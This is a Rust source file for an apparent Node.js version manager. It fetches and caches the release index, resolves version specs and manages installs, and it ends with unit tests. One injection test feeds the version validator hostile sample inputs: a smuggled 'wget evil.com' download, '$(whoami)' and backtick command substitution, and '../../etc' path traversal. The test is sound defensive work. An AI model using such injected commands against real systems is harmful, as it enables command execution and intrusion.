//! Node.js version management — index fetching, version resolution, install/uninstall.

use crate::download;
use crate::platform::Platform;
use lpm_common::LpmError;
use serde::Deserialize;
use std::path::PathBuf;

/// A single Node.js release from the distribution index.
#[derive(Debug, Clone, Deserialize)]
pub struct NodeRelease {
    /// Version string with 'v' prefix (e.g., "v22.5.0")
    pub version: String,
    /// Release date (e.g., "2024-07-17")
    pub date: String,
    /// Whether this is an LTS release
    pub lts: LtsField,
}

/// The `lts` field can be `false` or a string like `"Jod"`.
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
pub enum LtsField {
    Bool(bool),
    Name(String),
}

impl LtsField {
    pub fn is_lts(&self) -> bool {
        match self {
            LtsField::Bool(b) => *b,
            LtsField::Name(_) => true,
        }
    }

    pub fn name(&self) -> Option<&str> {
        match self {
            LtsField::Name(s) => Some(s),
            _ => None,
        }
    }
}

impl NodeRelease {
    /// Version without the 'v' prefix.
    pub fn version_bare(&self) -> &str {
        self.version.strip_prefix('v').unwrap_or(&self.version)
    }

    /// Download URL for this release on the given platform.
    ///
    /// e.g., `https://nodejs.org/dist/v22.5.0/node-v22.5.0-darwin-arm64.tar.gz`
    pub fn download_url(&self, platform: &Platform) -> String {
        let ext = if platform.os == "win" {
            "zip"
        } else {
            "tar.gz"
        };
        format!(
            "https://nodejs.org/dist/{}/node-{}-{}.{ext}",
            self.version,
            self.version,
            platform.node_suffix(),
        )
    }

    /// Expected SHA256 checksums URL.
    ///
    /// e.g., `https://nodejs.org/dist/v22.5.0/SHASUMS256.txt`
    pub fn shasums_url(&self) -> String {
        format!("https://nodejs.org/dist/{}/SHASUMS256.txt", self.version)
    }
}

/// Base directory for LPM runtime storage.
pub fn runtimes_dir() -> Result<PathBuf, LpmError> {
    let home = dirs::home_dir()
        .ok_or_else(|| LpmError::Script("could not determine home directory".into()))?;
    Ok(home.join(".lpm").join("runtimes"))
}

/// Directory for a specific installed Node.js version.
///
/// Returns `~/.lpm/runtimes/node/{version}/`
pub fn node_version_dir(version: &str) -> Result<PathBuf, LpmError> {
    Ok(runtimes_dir()?.join("node").join(version))
}

/// Path to the `node` binary for a specific installed version.
pub fn node_binary_path(version: &str) -> Result<PathBuf, LpmError> {
    let dir = node_version_dir(version)?;
    if cfg!(windows) {
        Ok(dir.join("node.exe"))
    } else {
        Ok(dir.join("bin").join("node"))
    }
}

/// Path to the `bin/` directory for a specific installed version.
pub fn node_bin_dir(version: &str) -> Result<PathBuf, LpmError> {
    let dir = node_version_dir(version)?;
    if cfg!(windows) {
        Ok(dir.clone())
    } else {
        Ok(dir.join("bin"))
    }
}

/// Check if a Node.js version is installed.
pub fn is_installed(version: &str) -> bool {
    node_binary_path(version)
        .map(|p| p.exists())
        .unwrap_or(false)
}

/// List all installed Node.js versions.
pub fn list_installed() -> Result<Vec<String>, LpmError> {
    let node_dir = runtimes_dir()?.join("node");
    if !node_dir.exists() {
        return Ok(vec![]);
    }

    let mut versions = Vec::new();
    for entry in std::fs::read_dir(&node_dir)? {
        let entry = entry?;
        if entry.path().is_dir() {
            let name = entry.file_name().to_string_lossy().to_string();
            // Verify it actually has a node binary
            if is_installed(&name) {
                versions.push(name);
            }
        }
    }

    versions.sort_by(|a, b| compare_versions(b, a)); // newest first
    Ok(versions)
}

/// Fetch the Node.js release index.
///
/// Caches to `~/.lpm/runtimes/index-cache.json` with a 1-hour TTL.
pub async fn fetch_index(client: &reqwest::Client) -> Result<Vec<NodeRelease>, LpmError> {
    let cache_path = runtimes_dir()?.join("index-cache.json");

    // Check cache freshness (1 hour TTL)
    if let Ok(meta) = std::fs::metadata(&cache_path)
        && let Ok(modified) = meta.modified()
    {
        let age = std::time::SystemTime::now()
            .duration_since(modified)
            .unwrap_or_default();
        if age.as_secs() < 3600
            && let Ok(content) = std::fs::read_to_string(&cache_path)
            && let Ok(releases) = serde_json::from_str::<Vec<NodeRelease>>(&content)
        {
            tracing::debug!("using cached node index ({} releases)", releases.len());
            return Ok(releases);
        }
    }

    // Fetch fresh index
    tracing::debug!("fetching node.js release index");
    let resp = client
        .get("https://nodejs.org/dist/index.json")
        .send()
        .await
        .map_err(|e| LpmError::Network(format!("failed to fetch node index: {e}")))?;

    if !resp.status().is_success() {
        return Err(LpmError::Http {
            status: resp.status().as_u16(),
            message: "failed to fetch node.js release index".into(),
        });
    }

    let body = resp
        .text()
        .await
        .map_err(|e| LpmError::Network(format!("failed to read node index body: {e}")))?;

    let releases: Vec<NodeRelease> = serde_json::from_str(&body)
        .map_err(|e| LpmError::Script(format!("failed to parse node index: {e}")))?;

    // Cache it (atomic: write to temp, then rename — prevents corrupted cache on crash)
    if let Some(parent) = cache_path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let temp_cache = cache_path.with_extension("json.tmp");
    if download::write_restricted_file(&temp_cache, body.as_bytes()).is_ok() {
        let _ = std::fs::rename(&temp_cache, &cache_path);
    }

    Ok(releases)
}

/// Validate a version spec string against injection attacks.
///
/// Allows alphanumeric characters plus semver operators and whitespace:
/// digits, letters, `.`, `*`, `_`, `^`, `~`, `>`, `=`, `<`, `|`, `-`, ` `.
/// Rejects empty specs, null bytes, shell metacharacters, and path traversal.
pub fn validate_version_spec(spec: &str) -> Result<(), LpmError> {
    if spec.is_empty() {
        return Err(LpmError::Script("version spec must not be empty".into()));
    }

    for ch in spec.chars() {
        if !matches!(ch,
            'a'..='z' | 'A'..='Z' | '0'..='9'
            | '.' | '*' | '_' | '^' | '~'
            | '>' | '=' | '<' | '|' | '-' | ' '
        ) {
            return Err(LpmError::Script(format!(
                "invalid character '{}' in version spec \"{}\". \
				 Only alphanumeric characters and semver operators (. * _ ^ ~ > = < | -) are allowed.",
                ch, spec
            )));
        }
    }

    Ok(())
}

/// Resolve a version spec (e.g., "22", "22.5", "22.5.0", "lts") to an exact version.
///
/// Returns `None` if the spec doesn't match any release.
/// The spec is validated before processing; invalid specs return `None` (with a warning logged).
pub fn resolve_version(releases: &[NodeRelease], spec: &str) -> Option<NodeRelease> {
    if let Err(e) = validate_version_spec(spec) {
        tracing::warn!("invalid version spec: {e}");
        return None;
    }

    let spec = spec.strip_prefix('v').unwrap_or(spec);

    // "lts" -> latest LTS
    if spec.eq_ignore_ascii_case("lts") {
        return releases.iter().find(|r| r.lts.is_lts()).cloned();
    }

    // "latest" -> latest release
    if spec.eq_ignore_ascii_case("latest") {
        return releases.first().cloned();
    }

    // Exact match: "22.5.0"
    let exact_target = if spec.starts_with('v') {
        spec.to_string()
    } else {
        format!("v{spec}")
    };

    if let Some(r) = releases.iter().find(|r| r.version == exact_target) {
        return Some(r.clone());
    }

    // Partial match: "22" -> latest 22.x.x, "22.5" -> latest 22.5.x
    let prefix = format!("v{spec}.");
    releases
        .iter()
        .find(|r| r.version.starts_with(&prefix) || r.version == format!("v{spec}"))
        .cloned()
}

/// Compare two version strings using `lpm_semver::Version` for correct semver ordering.
///
/// Falls back to lexicographic comparison if either version fails to parse
/// (should not happen for versions from the Node.js index or installed directories).
pub(crate) fn compare_versions(a: &str, b: &str) -> std::cmp::Ordering {
    match (lpm_semver::Version::parse(a), lpm_semver::Version::parse(b)) {
        (Ok(va), Ok(vb)) => va.cmp(&vb),
        _ => a.cmp(b),
    }
}

/// Find the best matching installed version for a version spec.
///
/// Supports:
/// 1. Exact versions ("22.5.0")
/// 2. Partial versions ("22", "22.5")
/// 3. Semver ranges (">=20.10.0", "^22", "~20.17.0")
///
/// Always returns the **highest** satisfying installed version, regardless of input order.
pub fn find_matching_installed(spec: &str, installed: &[String]) -> Option<String> {
    let spec = spec.strip_prefix('v').unwrap_or(spec);

    if spec.eq_ignore_ascii_case("lts") || spec.eq_ignore_ascii_case("latest") {
        return None;
    }

    // 1. Exact match -- only one version can match exactly.
    if let Some(v) = installed.iter().find(|v| v.as_str() == spec) {
        return Some(v.clone());
    }

    // 2. Range match for explicit semver requirements.
    if is_range_spec(spec) {
        let req = lpm_semver::VersionReq::parse(spec).ok()?;
        let mut matches: Vec<&String> = installed
            .iter()
            .filter(|v| {
                lpm_semver::Version::parse(v)
                    .ok()
                    .is_some_and(|version| req.matches(&version))
            })
            .collect();

        if !matches.is_empty() {
            matches.sort_by(|a, b| compare_versions(b, a));
            return Some(matches[0].clone());
        }

        return None;
    }

    // 3. Full semver specs are exact requirements. If the exact match wasn't found,
    // do not silently downgrade to an older version in the same major.
    if lpm_semver::Version::parse(spec).is_ok() {
        return None;
    }

    // 4. Prefix match for partial versions (e.g., "22" or "22.5").
    let prefix = format!("{spec}.");
    let mut matches: Vec<&String> = installed
        .iter()
        .filter(|v| v.starts_with(&prefix))
        .collect();

    if !matches.is_empty() {
        matches.sort_by(|a, b| compare_versions(b, a)); // descending
        return Some(matches[0].clone());
    }

    None
}

fn is_range_spec(spec: &str) -> bool {
    spec.contains('>')
        || spec.contains('<')
        || spec.contains('^')
        || spec.contains('~')
        || spec.contains('|')
        || spec.contains('*')
        || spec.split_whitespace().count() > 1
}

/// Remove an installed Node.js version.
pub fn uninstall(version: &str) -> Result<(), LpmError> {
    let dir = node_version_dir(version)?;
    if dir.exists() {
        std::fs::remove_dir_all(&dir)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample_releases() -> Vec<NodeRelease> {
        vec![
            NodeRelease {
                version: "v22.5.0".into(),
                date: "2024-07-17".into(),
                lts: LtsField::Bool(false),
            },
            NodeRelease {
                version: "v22.4.1".into(),
                date: "2024-07-08".into(),
                lts: LtsField::Bool(false),
            },
            NodeRelease {
                version: "v20.18.0".into(),
                date: "2024-10-03".into(),
                lts: LtsField::Name("Iron".into()),
            },
            NodeRelease {
                version: "v20.17.0".into(),
                date: "2024-08-21".into(),
                lts: LtsField::Name("Iron".into()),
            },
            NodeRelease {
                version: "v18.20.4".into(),
                date: "2024-08-07".into(),
                lts: LtsField::Name("Hydrogen".into()),
            },
        ]
    }

    #[test]
    fn resolve_exact_version() {
        let releases = sample_releases();
        let r = resolve_version(&releases, "22.5.0").unwrap();
        assert_eq!(r.version, "v22.5.0");
    }

    #[test]
    fn resolve_major_version() {
        let releases = sample_releases();
        let r = resolve_version(&releases, "22").unwrap();
        assert_eq!(r.version, "v22.5.0"); // latest 22.x
    }

    #[test]
    fn resolve_major_minor() {
        let releases = sample_releases();
        let r = resolve_version(&releases, "20.17").unwrap();
        assert_eq!(r.version, "v20.17.0");
    }

    #[test]
    fn resolve_lts() {
        let releases = sample_releases();
        let r = resolve_version(&releases, "lts").unwrap();
        assert_eq!(r.version, "v20.18.0"); // first LTS
    }

    #[test]
    fn resolve_latest() {
        let releases = sample_releases();
        let r = resolve_version(&releases, "latest").unwrap();
        assert_eq!(r.version, "v22.5.0");
    }

    #[test]
    fn resolve_with_v_prefix() {
        let releases = sample_releases();
        let r = resolve_version(&releases, "v22.5.0").unwrap();
        assert_eq!(r.version, "v22.5.0");
    }

    #[test]
    fn lts_field_detection() {
        assert!(!LtsField::Bool(false).is_lts());
        assert!(LtsField::Name("Iron".into()).is_lts());
        assert_eq!(LtsField::Name("Iron".into()).name(), Some("Iron"));
    }

    #[test]
    fn find_matching_exact() {
        let installed = vec!["22.22.2".into(), "20.20.2".into()];
        assert_eq!(
            find_matching_installed("22.22.2", &installed),
            Some("22.22.2".into())
        );
    }

    #[test]
    fn find_matching_major_prefix() {
        let installed = vec!["22.22.2".into(), "20.20.2".into()];
        assert_eq!(
            find_matching_installed("22", &installed),
            Some("22.22.2".into())
        );
    }

    #[test]
    fn find_matching_major_minor_prefix() {
        let installed = vec!["22.22.2".into(), "20.20.2".into()];
        assert_eq!(
            find_matching_installed("20.20", &installed),
            Some("20.20.2".into())
        );
    }

    #[test]
    fn find_matching_full_version_does_not_downgrade_to_same_major() {
        let installed = vec!["20.5.0".into(), "18.20.4".into()];
        assert_eq!(find_matching_installed("20.10.0", &installed), None);
    }

    #[test]
    fn find_matching_range_spec_uses_semver_matching() {
        let installed = vec!["20.5.0".into(), "20.11.0".into(), "18.20.4".into()];
        assert_eq!(
            find_matching_installed(">=20.10.0", &installed),
            Some("20.11.0".into())
        );
    }

    #[test]
    fn find_matching_no_match() {
        let installed = vec!["22.22.2".into(), "20.20.2".into()];
        assert_eq!(find_matching_installed("18", &installed), None);
    }

    #[test]
    fn download_url_format() {
        let r = NodeRelease {
            version: "v22.5.0".into(),
            date: "2024-07-17".into(),
            lts: LtsField::Bool(false),
        };
        let p = Platform {
            os: "darwin",
            arch: "arm64",
        };
        let url = r.download_url(&p);
        assert_eq!(
            url,
            "https://nodejs.org/dist/v22.5.0/node-v22.5.0-darwin-arm64.tar.gz"
        );
    }

    #[test]
    fn download_url_format_windows_uses_zip() {
        let r = NodeRelease {
            version: "v22.5.0".into(),
            date: "2024-07-17".into(),
            lts: LtsField::Bool(false),
        };
        let p = Platform {
            os: "win",
            arch: "x64",
        };
        let url = r.download_url(&p);
        assert_eq!(
            url, "https://nodejs.org/dist/v22.5.0/node-v22.5.0-win-x64.zip",
            "Windows download URL must use .zip, not .tar.gz"
        );
    }

    #[test]
    fn download_url_format_linux_uses_tar_gz() {
        let r = NodeRelease {
            version: "v20.18.0".into(),
            date: "2024-10-03".into(),
            lts: LtsField::Name("Iron".into()),
        };
        let p = Platform {
            os: "linux",
            arch: "x64",
        };
        let url = r.download_url(&p);
        assert_eq!(
            url,
            "https://nodejs.org/dist/v20.18.0/node-v20.18.0-linux-x64.tar.gz"
        );
    }

    // Finding #5: Version spec validation
    #[test]
    fn validate_version_spec_valid() {
        assert!(validate_version_spec("22").is_ok());
        assert!(validate_version_spec("22.5.0").is_ok());
        assert!(validate_version_spec("lts").is_ok());
        assert!(validate_version_spec("latest").is_ok());
        assert!(validate_version_spec(">=22.0.0").is_ok());
        assert!(validate_version_spec("^20").is_ok());
        assert!(validate_version_spec("~18.0.0").is_ok());
        assert!(validate_version_spec(">=20.0.0 <22.0.0").is_ok());
        assert!(validate_version_spec("20.0.0 || 22.0.0").is_ok());
    }

    #[test]
    fn validate_version_spec_injection() {
        assert!(validate_version_spec("22; wget evil.com").is_err());
        assert!(validate_version_spec("../../etc").is_err());
        assert!(validate_version_spec("").is_err());
        assert!(validate_version_spec("22\0bad").is_err());
        assert!(validate_version_spec("$(whoami)").is_err());
        assert!(validate_version_spec("22`id`").is_err());
    }

    // Finding #7: find_matching_installed must return highest, not first
    #[test]
    fn find_matching_installed_returns_highest_not_first() {
        let installed = vec![
            "22.1.0".to_string(),
            "22.5.0".to_string(),
            "22.3.0".to_string(),
        ];
        // Must return 22.5.0 (highest), not 22.1.0 (first)
        assert_eq!(
            find_matching_installed("22", &installed),
            Some("22.5.0".into())
        );
    }

    // Finding #15: compare_versions using lpm_semver
    #[test]
    fn compare_versions_correctness() {
        use std::cmp::Ordering;
        assert_eq!(compare_versions("22.5.0", "22.4.1"), Ordering::Greater);
        assert_eq!(compare_versions("22.4.1", "22.5.0"), Ordering::Less);
        assert_eq!(compare_versions("22.5.0", "22.5.0"), Ordering::Equal);
        assert_eq!(compare_versions("20.18.0", "22.5.0"), Ordering::Less);
    }

    // Corrupted cache file must not prevent future operations
    #[test]
    fn corrupted_cache_json_is_ignored() {
        // If index-cache.json contains invalid JSON, fetch_index should re-fetch
        // (in unit test context it will fail on the network call, but the important
        // thing is that it doesn't panic or return the corrupted data).
        let dir = tempfile::tempdir().unwrap();
        let cache_path = dir.path().join("index-cache.json");

        // Write corrupted JSON
        std::fs::write(&cache_path, b"{ truncated").unwrap();

        // The serde_json parse should fail, so it won't return corrupted data
        let content = std::fs::read_to_string(&cache_path).unwrap();
        let result = serde_json::from_str::<Vec<NodeRelease>>(&content);
        assert!(
            result.is_err(),
            "corrupted cache JSON must not parse successfully"
        );
    }

    // Atomic cache write: temp file should not persist after rename
    #[test]
    fn atomic_cache_write_cleans_up_temp() {
        let dir = tempfile::tempdir().unwrap();
        let cache_path = dir.path().join("index-cache.json");
        let temp_path = cache_path.with_extension("json.tmp");

        // Simulate the atomic write pattern
        let body = r#"[{"version":"v22.5.0","date":"2024-07-17","lts":false}]"#;
        download::write_restricted_file(&temp_path, body.as_bytes()).unwrap();
        assert!(temp_path.exists(), "temp file should exist before rename");

        std::fs::rename(&temp_path, &cache_path).unwrap();
        assert!(
            !temp_path.exists(),
            "temp file should not exist after rename"
        );
        assert!(cache_path.exists(), "cache file should exist after rename");

        // Verify the content is valid JSON
        let content = std::fs::read_to_string(&cache_path).unwrap();
        let releases: Vec<NodeRelease> = serde_json::from_str(&content).unwrap();
        assert_eq!(releases.len(), 1);
        assert_eq!(releases[0].version, "v22.5.0");
    }

    // Cache file permissions on Unix
    #[cfg(unix)]
    #[test]
    fn cache_file_has_restricted_permissions() {
        use std::os::unix::fs::PermissionsExt;
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("test-cache.json");

        download::write_restricted_file(&file, b"{}").unwrap();
        let mode = std::fs::metadata(&file).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "cache file should be 0o600, got {mode:o}");
    }
}
